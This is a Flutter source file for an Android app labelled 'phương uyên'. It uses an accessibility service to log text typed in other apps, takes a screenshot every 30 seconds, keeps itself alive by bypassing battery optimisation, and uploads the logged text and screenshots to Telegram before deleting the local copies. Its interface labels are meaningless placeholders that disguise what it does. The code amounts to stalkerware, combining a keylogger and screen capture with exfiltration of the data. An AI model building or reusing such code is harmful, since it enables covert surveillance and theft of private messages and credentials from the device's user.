import 'dart:async';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'db_helper.dart';
import 'monitor_service.dart';
import 'login_screen.dart';

void main() {
  runApp(const SelfMonitorApp());
}

class SelfMonitorApp extends StatelessWidget {
  const SelfMonitorApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'phương uyên',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(colorSchemeSeed: Colors.pink, useMaterial3: true),
      home: const LoginScreen(),
    );
  }
}

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
  bool _accessibilityEnabled = false;
  bool _screenshotServiceRunning = false;
  bool _batteryOptIgnored = false;
  static const int _intervalSeconds = 30;
  bool _checking = true;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _refreshStatus();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _refreshStatus();
    }
  }

  Future<void> _refreshStatus() async {
    setState(() => _checking = true);
    final accEnabled = await MonitorService.isAccessibilityServiceEnabled();
    final screenshotRunning = await MonitorService.isScreenshotServiceRunning();
    final batteryIgnored =
        await MonitorService.isIgnoringBatteryOptimizations();

    if (mounted) {
      setState(() {
        _accessibilityEnabled = accEnabled;
        _screenshotServiceRunning = screenshotRunning;
        _batteryOptIgnored = batteryIgnored;
        _checking = false;
      });
    }
  }

  Future<void> _toggleAccessibility() async {
    await MonitorService.openAccessibilitySettings();
    await Future.delayed(const Duration(milliseconds: 600));
    _refreshStatus();
  }

  Future<void> _toggleScreenshotService() async {
    if (_screenshotServiceRunning) {
      await MonitorService.stopScreenshotService();
    } else {
      final granted = await MonitorService.requestScreenCapturePermission();
      if (granted) {
        await MonitorService.startScreenshotService(
          intervalSeconds: _intervalSeconds,
        );
      } else {
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(
              content: Text('Quyền chụp màn hình bị từ chối hoặc đã huỷ.'),
            ),
          );
        }
      }
    }
    await Future.delayed(const Duration(milliseconds: 300));
    _refreshStatus();
  }

  Future<void> _requestBatteryOptimization() async {
    await MonitorService.requestIgnoreBatteryOptimizations();
    await Future.delayed(const Duration(milliseconds: 600));
    _refreshStatus();
  }

  void _showAndroid13Guide() {
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Text('Lưu ý mở khoá quyền trên Android 13+'),
        content: const SingleChildScrollView(
          child: Text("", style: TextStyle(fontSize: 14, height: 1.4)),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx),
            child: const Text('Đã hiểu'),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('phương uyên'),
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh),
            tooltip: 'Làm mới trạng thái',
            onPressed: _refreshStatus,
          ),
          IconButton(
            icon: const Icon(Icons.logout_rounded),
            tooltip: 'Đăng xuất',
            onPressed: () {
              Navigator.of(context).pushReplacement(
                MaterialPageRoute(builder: (_) => const LoginScreen()),
              );
            },
          ),
        ],
      ),
      body: _checking
          ? const Center(child: CircularProgressIndicator())
          : RefreshIndicator(
              onRefresh: _refreshStatus,
              child: ListView(
                padding: const EdgeInsets.all(16),
                children: [
                  if (!MonitorService.isAndroid)
                    Container(
                      margin: const EdgeInsets.only(bottom: 16),
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        color: Colors.amber.shade100,
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(color: Colors.amber.shade400),
                      ),
                      child: Row(
                        children: [
                          Icon(
                            Icons.warning_amber_rounded,
                            color: Colors.amber.shade900,
                          ),
                          const SizedBox(width: 10),
                          Expanded(
                            child: Text(
                              'Ứng dụng đang chạy trên ${Platform.operatingSystem}. Tính năng Accessibility và Chụp màn hình chỉ hoạt động trên thiết bị Android.',
                              style: TextStyle(
                                color: Colors.amber.shade900,
                                fontSize: 13,
                                fontWeight: FontWeight.w500,
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),

                  _buildStatusCard(
                    title: 'Phương Uyên 01',

                    enabled: _batteryOptIgnored,
                    onToggle: _requestBatteryOptimization,
                    toggleLabel: _batteryOptIgnored ? 'Phương' : 'Uyên 01',
                    color: Colors.teal,
                  ),
                  const SizedBox(height: 16),

                  _buildStatusCard(
                    title: 'Phuong Uyên 02',
                    enabled: _accessibilityEnabled,
                    onToggle: _toggleAccessibility,
                    toggleLabel: _accessibilityEnabled ? 'Phương' : 'Uyên 02',
                    trailingAction: TextButton.icon(
                      onPressed: _showAndroid13Guide,
                      icon: const Icon(Icons.help_outline, size: 16),
                      label: const Text('Phương Uyên 03'),
                    ),
                  ),
                  const SizedBox(height: 16),

                  Card(
                    elevation: 1,
                    child: Padding(
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Row(
                            children: [
                              Icon(
                                _screenshotServiceRunning
                                    ? Icons.check_circle
                                    : Icons.circle_outlined,
                                color: _screenshotServiceRunning
                                    ? Colors.green
                                    : Colors.grey,
                              ),
                              const SizedBox(width: 8),
                              const Expanded(
                                child: Text(
                                  'Phương Uyên 03',
                                  style: TextStyle(
                                    fontSize: 16,
                                    fontWeight: FontWeight.bold,
                                  ),
                                ),
                              ),
                            ],
                          ),

                          const SizedBox(height: 8),
                          SizedBox(
                            width: double.infinity,
                            child: FilledButton(
                              onPressed: _toggleScreenshotService,
                              style: _screenshotServiceRunning
                                  ? FilledButton.styleFrom(
                                      backgroundColor: Colors.red.shade700,
                                    )
                                  : null,
                              child: Text(
                                _screenshotServiceRunning
                                    ? 'Phương Uyên 04'
                                    : 'Phương Uyên 05',
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ),
    );
  }

  Widget _buildStatusCard({
    required String title,
    required bool enabled,
    required VoidCallback onToggle,
    required String toggleLabel,
    Color? color,
    Widget? trailingAction,
  }) {
    return Card(
      elevation: 1,
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Icon(
                  enabled ? Icons.check_circle : Icons.circle_outlined,
                  color: enabled ? (color ?? Colors.green) : Colors.grey,
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: Text(
                    title,
                    style: const TextStyle(
                      fontSize: 16,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 8),
            if (trailingAction != null) ...[
              const SizedBox(height: 4),
              trailingAction,
            ],
            const SizedBox(height: 12),
            SizedBox(
              width: double.infinity,
              child: FilledButton(
                onPressed: onToggle,
                child: Text(toggleLabel),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class TimelineScreen extends StatefulWidget {
  const TimelineScreen({super.key});

  @override
  State<TimelineScreen> createState() => _TimelineScreenState();
}

class _TimelineScreenState extends State<TimelineScreen> {
  List<Map<String, dynamic>> _textLogs = [];
  List<Map<String, dynamic>> _screenshots = [];
  Timer? _autoRefreshTimer;
  bool _isLoading = false;
  String _searchQuery = '';

  @override
  void initState() {
    super.initState();
    _load();
    _autoRefreshTimer = Timer.periodic(
      const Duration(seconds: 3),
      (_) => _load(silent: true),
    );
  }

  @override
  void dispose() {
    _autoRefreshTimer?.cancel();
    super.dispose();
  }

  Future<void> _load({bool silent = false}) async {
    if (!silent) {
      setState(() => _isLoading = true);
    }
    try {
      final texts = await DbHelper.instance.getTextLogs();
      final shots = await DbHelper.instance.getScreenshots();
      if (mounted) {
        setState(() {
          _textLogs = texts;
          _screenshots = shots;
          _isLoading = false;
        });
      }
    } catch (_) {
      if (mounted) {
        setState(() => _isLoading = false);
      }
    }
  }

  void _viewFullImage(String filePath, String timestamp) {
    showDialog(
      context: context,
      builder: (ctx) => Dialog(
        insetPadding: const EdgeInsets.all(12),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            AppBar(
              title: Text(timestamp, style: const TextStyle(fontSize: 14)),
              leading: IconButton(
                icon: const Icon(Icons.close),
                onPressed: () => Navigator.pop(ctx),
              ),
            ),
            Flexible(
              child: InteractiveViewer(
                child: Image.file(
                  File(filePath),
                  fit: BoxFit.contain,
                  errorBuilder: (c, e, s) => const Padding(
                    padding: EdgeInsets.all(32),
                    child: Text('Không thể tải file ảnh'),
                  ),
                ),
              ),
            ),
            Padding(
              padding: const EdgeInsets.all(8.0),
              child: Text(
                filePath,
                style: const TextStyle(fontSize: 11, color: Colors.grey),
                maxLines: 2,
                overflow: TextOverflow.ellipsis,
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final filteredLogs = _searchQuery.isEmpty
        ? _textLogs
        : _textLogs.where((log) {
            final content = (log['content'] ?? '').toString().toLowerCase();
            final pkg = (log['package_name'] ?? '').toString().toLowerCase();
            final q = _searchQuery.toLowerCase();
            return content.contains(q) || pkg.contains(q);
          }).toList();

    return DefaultTabController(
      length: 2,
      child: Scaffold(
        appBar: AppBar(
          title: const Text('Lịch sử đã ghi'),
          actions: [
            IconButton(
              icon: const Icon(Icons.cloud_upload_outlined),
              tooltip: 'Gửi bù lên Telegram',
              onPressed: () async {
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(
                    content: Text('Đang gửi bù dữ liệu lên Telegram...'),
                    duration: Duration(seconds: 1),
                  ),
                );
                final res = await MonitorService.syncTelegramNow();
                _load(silent: true);
                if (context.mounted) {
                  final sentP = res['sentPhotos'] ?? 0;
                  final sentT = res['sentTexts'] ?? 0;
                  final err = res['error'] as String? ?? '';
                  if (err.isNotEmpty && sentP == 0 && sentT == 0) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                        content: Text('Lỗi gửi: $err'),
                        backgroundColor: Colors.red,
                      ),
                    );
                  } else {
                    ScaffoldMessenger.of(context).showSnackBar(
                      SnackBar(
                        content: Text(
                          'Đã gửi $sentP ảnh và $sentT text lên Telegram, dọn sạch bộ nhớ Máy 1.',
                        ),
                        backgroundColor: Colors.green,
                      ),
                    );
                  }
                }
              },
            ),
            IconButton(
              icon: const Icon(Icons.refresh),
              tooltip: 'Làm mới',
              onPressed: () => _load(silent: false),
            ),
          ],
          bottom: TabBar(
            tabs: [
              Tab(
                icon: const Icon(Icons.keyboard_alt_outlined),
                text: 'Text (${_textLogs.length})',
              ),
              Tab(
                icon: const Icon(Icons.photo_library_outlined),
                text: 'Ảnh (${_screenshots.length})',
              ),
            ],
          ),
        ),
        body: TabBarView(
          children: [
            // Tab 1: Text logs
            Column(
              children: [
                Padding(
                  padding: const EdgeInsets.fromLTRB(16, 8, 16, 8),
                  child: TextField(
                    decoration: InputDecoration(
                      hintText: 'Tìm kiếm nội dung hoặc tên app...',
                      prefixIcon: const Icon(Icons.search),
                      isDense: true,
                      filled: true,
                      fillColor: Colors.grey.shade100,
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(10),
                        borderSide: BorderSide.none,
                      ),
                    ),
                    onChanged: (val) {
                      setState(() => _searchQuery = val.trim());
                    },
                  ),
                ),
                Expanded(
                  child: _isLoading && _textLogs.isEmpty
                      ? const Center(child: CircularProgressIndicator())
                      : RefreshIndicator(
                          onRefresh: () => _load(silent: false),
                          child: filteredLogs.isEmpty
                              ? ListView(
                                  children: [
                                    const SizedBox(height: 120),
                                    Icon(
                                      Icons.notes,
                                      size: 64,
                                      color: Colors.grey.shade400,
                                    ),
                                    const SizedBox(height: 16),
                                    Center(
                                      child: Text(
                                        _searchQuery.isNotEmpty
                                            ? 'Không tìm thấy kết quả phù hợp'
                                            : 'Chưa có dữ liệu gõ phím nào.',
                                        style: const TextStyle(
                                          fontSize: 16,
                                          fontWeight: FontWeight.bold,
                                        ),
                                      ),
                                    ),
                                    const SizedBox(height: 8),
                                    Padding(
                                      padding: const EdgeInsets.symmetric(
                                        horizontal: 32,
                                      ),
                                      child: Text(
                                        _searchQuery.isNotEmpty
                                            ? 'Thử tìm kiếm với từ khoá khác.'
                                            : 'Hãy đảm bảo bạn đã BẬT quyền Accessibility cho phương uyên, sau đó mở ứng dụng khác (Note, Chrome, Zalo...) và gõ chữ thử nghiệm.',
                                        textAlign: TextAlign.center,
                                        style: const TextStyle(
                                          color: Colors.grey,
                                        ),
                                      ),
                                    ),
                                  ],
                                )
                              : ListView.separated(
                                  itemCount: filteredLogs.length,
                                  separatorBuilder: (context, index) =>
                                      const Divider(height: 1),
                                  itemBuilder: (ctx, i) {
                                    final item = filteredLogs[i];
                                    final time = item['timestamp'] ?? '';
                                    final pkg = item['package_name'] ?? '';
                                    final content = item['content'] ?? '';

                                    return ListTile(
                                      leading: CircleAvatar(
                                        backgroundColor: Colors.indigo.shade50,
                                        child: const Icon(
                                          Icons.text_snippet,
                                          color: Colors.indigo,
                                        ),
                                      ),
                                      title: SelectableText(
                                        content,
                                        style: const TextStyle(
                                          fontWeight: FontWeight.w600,
                                        ),
                                      ),
                                      subtitle: Text(
                                        '$pkg • $time',
                                        style: const TextStyle(fontSize: 12),
                                      ),
                                      trailing: IconButton(
                                        icon: const Icon(Icons.copy, size: 18),
                                        tooltip: 'Sao chép nội dung',
                                        onPressed: () {
                                          Clipboard.setData(
                                            ClipboardData(text: content),
                                          );
                                          ScaffoldMessenger.of(
                                            context,
                                          ).showSnackBar(
                                            const SnackBar(
                                              content: Text(
                                                'Đã sao chép vào bộ nhớ tạm',
                                              ),
                                              duration: Duration(seconds: 1),
                                            ),
                                          );
                                        },
                                      ),
                                    );
                                  },
                                ),
                        ),
                ),
              ],
            ),

            RefreshIndicator(
              onRefresh: () => _load(silent: false),
              child: _screenshots.isEmpty
                  ? ListView(
                      children: const [
                        SizedBox(height: 120),
                        Icon(
                          Icons.photo_size_select_actual_outlined,
                          size: 64,
                          color: Colors.grey,
                        ),
                        SizedBox(height: 16),
                        Center(
                          child: Text(
                            'Chưa có ảnh chụp màn hình nào.',
                            style: TextStyle(
                              fontSize: 16,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                        ),
                        SizedBox(height: 8),
                        Padding(
                          padding: EdgeInsets.symmetric(horizontal: 32),
                          child: Text(
                            'Hãy bấm "Bắt đầu chụp màn hình" và chọn "Bắt đầu ngay" trong hộp thoại Android. Ảnh đầu tiên sẽ lưu sau 1.5 giây.',
                            textAlign: TextAlign.center,
                            style: TextStyle(color: Colors.grey),
                          ),
                        ),
                      ],
                    )
                  : GridView.builder(
                      padding: const EdgeInsets.all(8),
                      gridDelegate:
                          const SliverGridDelegateWithFixedCrossAxisCount(
                            crossAxisCount: 3,
                            crossAxisSpacing: 6,
                            mainAxisSpacing: 6,
                            childAspectRatio: 0.65,
                          ),
                      itemCount: _screenshots.length,
                      itemBuilder: (ctx, i) {
                        final item = _screenshots[i];
                        final filePath = item['file_path'] as String? ?? '';
                        final timestamp = item['timestamp'] as String? ?? '';
                        final file = File(filePath);

                        return GestureDetector(
                          onTap: () => _viewFullImage(filePath, timestamp),
                          child: Card(
                            clipBehavior: Clip.antiAlias,
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.stretch,
                              children: [
                                Expanded(
                                  child: file.existsSync()
                                      ? Image.file(
                                          file,
                                          cacheWidth: 300,
                                          fit: BoxFit.cover,
                                          errorBuilder: (c, e, s) => Container(
                                            color: Colors.grey[200],
                                            child: const Icon(
                                              Icons.broken_image,
                                            ),
                                          ),
                                        )
                                      : Container(
                                          color: Colors.grey[200],
                                          child: const Icon(Icons.broken_image),
                                        ),
                                ),
                                Container(
                                  color: Colors.black54,
                                  padding: const EdgeInsets.symmetric(
                                    vertical: 2,
                                    horizontal: 4,
                                  ),
                                  child: Text(
                                    timestamp.length > 19
                                        ? timestamp.substring(11, 19)
                                        : timestamp,
                                    style: const TextStyle(
                                      color: Colors.white,
                                      fontSize: 10,
                                    ),
                                    textAlign: TextAlign.center,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        );
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }
}
